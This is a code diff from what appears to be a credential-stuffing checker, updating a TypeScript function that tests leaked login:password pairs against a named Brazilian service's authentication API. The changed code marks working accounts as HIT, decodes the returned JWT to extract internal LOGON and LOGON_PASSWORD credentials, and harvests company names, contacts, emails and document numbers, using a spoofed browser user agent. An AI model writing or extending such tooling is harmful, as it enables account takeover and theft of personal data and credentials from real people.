@@ -1237,21 +1237,21 @@ async function checkPrivacy(login: string, password: string): Promise<CheckResul
 // ═══════════════════════════════════════════════════════════════════════════════
 //  CHECKOK.COM.BR — app.checkok.com.br/entrar
 //  API: POST https://bff.checkok.com.br/auth
-//  Body: { username: string, password: string }  (username = email, CPF ou código)
-//  200 → HIT (JWT + dados da conta)   403 → FAIL   422 → formato inválido
-//  Após HIT: busca info em rok.api.delend.com.br/customer/v1/user-info
+//  Body: { username: string, password: string }  (email, CPF ou código do cliente)
+//  200 + isActive:true  → HIT   (todos os dados da conta + LOGON real do JWT)
+//  200 + isActive:false → FAIL  (conta inativa — não consegue logar no site)
+//  403 → FAIL (senha errada)    422 → FAIL (formato inválido)
 // ═══════════════════════════════════════════════════════════════════════════════
 const CHECKOK_AUTH_URL = "https://bff.checkok.com.br/auth";
-const CHECKOK_INFO_URL = "https://rok.api.delend.com.br/customer/v1/user-info";
 const CHECKOK_TIMEOUT  = 15_000;
 const CHECKOK_UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";
 
 async function checkCheckOK(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
 
-  // Step 1: POST /auth → JWT
-  let authText: string;
+  // POST /auth — aceita código, CPF ou e-mail como username
   let authStatus: number;
+  let authText: string;
   try {
     const r = await runCurl([
       "-X", "POST",
@@ -1269,71 +1269,63 @@ async function checkCheckOK(login: string, password: string): Promise<CheckResul
     return { credential, login, status: "ERROR", detail: `NET:${String(e).slice(0, 80)}` };
   }
 
-  // FAIL: credenciais inválidas (403) ou formato ruim (422)
-  if (authStatus === 403) {
-    return { credential, login, status: "FAIL", detail: "usuario_ou_senha_errados" };
-  }
-  if (authStatus === 422) {
-    return { credential, login, status: "FAIL", detail: "formato_invalido" };
-  }
-  if (authStatus !== 200) {
-    return { credential, login, status: "ERROR", detail: `HTTP_${authStatus}:${authText.slice(0, 60)}` };
-  }
+  if (authStatus === 403) return { credential, login, status: "FAIL", detail: "usuario_ou_senha_errados" };
+  if (authStatus === 422) return { credential, login, status: "FAIL", detail: "formato_invalido" };
+  if (authStatus !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${authStatus}:${authText.slice(0, 60)}` };
 
-  // Parse JWT response
   let authJson: Record<string, unknown>;
   try { authJson = JSON.parse(authText); } catch {
     return { credential, login, status: "ERROR", detail: `JSON_ERR:${authText.slice(0, 60)}` };
   }
 
-  const accessToken = String(
-    (authJson as Record<string, unknown>).access_token ??
-    (authJson as Record<string, unknown>).token ??
-    ((authJson as Record<string, unknown>).data as Record<string, unknown> | undefined)?.token ??
-    ""
-  ).trim();
+  const accessToken = String(authJson.access_token ?? authJson.token ?? "").trim();
+  if (!accessToken) return { credential, login, status: "ERROR", detail: `NO_TOKEN:${authText.slice(0, 80)}` };
 
-  if (!accessToken) {
-    return { credential, login, status: "ERROR", detail: `NO_TOKEN:${authText.slice(0, 80)}` };
+  // Conta inativa — 200 mas não consegue entrar no site
+  if (authJson.isActive === false) {
+    const empresa = String(authJson.nome_fantasia ?? "").trim();
+    const email   = String(authJson.email ?? "").trim();
+    return {
+      credential, login, status: "FAIL",
+      detail: `conta_inativa${empresa ? ` | empresa:${empresa}` : ""}${email ? ` | email:${email}` : ""}`,
+    };
   }
 
-  // Step 2: buscar dados da conta (opcional, ignora falhas)
-  const parts: string[] = [];
+  // Decodifica JWT para extrair LOGON e LOGON_PASSWORD (credenciais reais do sistema)
+  let jwtLogon = "";
+  let jwtPass  = "";
   try {
-    const infoR = await runCurl([
-      "-H", `User-Agent: ${CHECKOK_UA}`,
-      "-H", "Accept: application/json",
-      "-H", `Authorization: Bearer ${accessToken}`,
-      CHECKOK_INFO_URL,
-    ], 10_000);
+    const payload = JSON.parse(Buffer.from(accessToken.split(".")[1], "base64url").toString()) as Record<string, unknown>;
+    jwtLogon = String(payload["LOGON"]          ?? "").trim();
+    jwtPass  = String(payload["LOGON_PASSWORD"] ?? "").trim();
+  } catch { /* JWT inválido — continua sem */ }
 
-    if (infoR.statusCode === 200 && infoR.body.trim()) {
-      const info = JSON.parse(infoR.body) as Record<string, unknown>;
-      const person   = (info.person   ?? {}) as Record<string, unknown>;
-      const customer = (info.customer ?? {}) as Record<string, unknown>;
-      const company  = (customer.company ?? {}) as Record<string, unknown>;
+  // Extrai dados diretamente da resposta do /auth (response já traz tudo)
+  const parts: string[] = [];
+  const logon    = jwtLogon || String(authJson.logon ?? "").trim();
+  const empresa  = String(authJson.nome_fantasia ?? "").trim();
+  const contato  = String(authJson.contato ?? "").trim();
+  const email    = String(authJson.email ?? "").trim();
+  const doc      = String(authJson.documento ?? "").trim();
+  const codigo   = String(authJson.codigo ?? "").trim();
+  const brand    = String(authJson.brand ?? "").trim();
 
-      const name        = String(person.name ?? "").trim();
-      const email       = String(person.email ?? "").trim();
-      const cpf         = String(person.cpf ?? person.logon ?? "").trim();
-      const cnpj        = String(company.cnpj ?? "").trim();
-      const companyName = String(company.fantasyName ?? company.name ?? "").trim();
-      const status      = String(customer.status ?? info.status ?? "").trim();
-
-      if (name)        parts.push(`nome:${name}`);
-      if (email)       parts.push(`email:${email}`);
-      if (cpf)         parts.push(`cpf:${cpf}`);
-      if (cnpj)        parts.push(`cnpj:${cnpj}`);
-      if (companyName) parts.push(`empresa:${companyName}`);
-      if (status)      parts.push(`status:${status}`);
-    }
-  } catch { /* dados extras falhou — ainda é HIT */ }
+  // LOGON real (para entrar no sistema interno)
+  if (logon)   parts.push(`logon:${logon}`);
+  if (jwtPass) parts.push(`senha_logon:${jwtPass}`);
+  // Dados da conta
+  if (empresa)  parts.push(`empresa:${empresa}`);
+  if (contato)  parts.push(`contato:${contato}`);
+  if (email)    parts.push(`email:${email}`);
+  if (doc)      parts.push(`doc:${doc}`);
+  if (codigo)   parts.push(`codigo:${codigo}`);
+  if (brand && brand !== "LOGON MASTER") parts.push(`brand:${brand}`);
 
   return {
     credential,
     login,
     status: "HIT",
-    detail: parts.length > 0 ? parts.join(" | ") : "checkok_autenticado",
+    detail: parts.length > 0 ? parts.join(" | ") : "checkok_ativo",
   };
 }
 
